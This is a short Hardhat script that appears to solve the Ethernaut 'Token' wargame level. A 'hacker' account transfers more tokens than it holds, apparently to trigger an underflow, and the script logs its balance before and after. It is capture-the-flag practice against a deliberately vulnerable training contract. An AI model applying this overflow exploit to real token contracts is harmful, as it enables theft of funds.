// ethers was not working => hre
const hre = require("hardhat");

async function main() {
  const [hacker, user1] = await hre.ethers.getSigners();

  // put Ethernaut contract address here
  const Token_contract_address = '0x6Fb0354e45E3415EAEF2E2a9521Dc89188530234'

  const Token = await hre.ethers.getContractAt("Token", Token_contract_address);

  console.log(`Hacker Balance Before = ${await Token.balanceOf(hacker.address)}`);

  await Token.connect(hacker).transfer(user1.address, ethers.utils.parseUnits('21'));

  console.log(`Hacker Balance After = ${await Token.balanceOf(hacker.address)}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
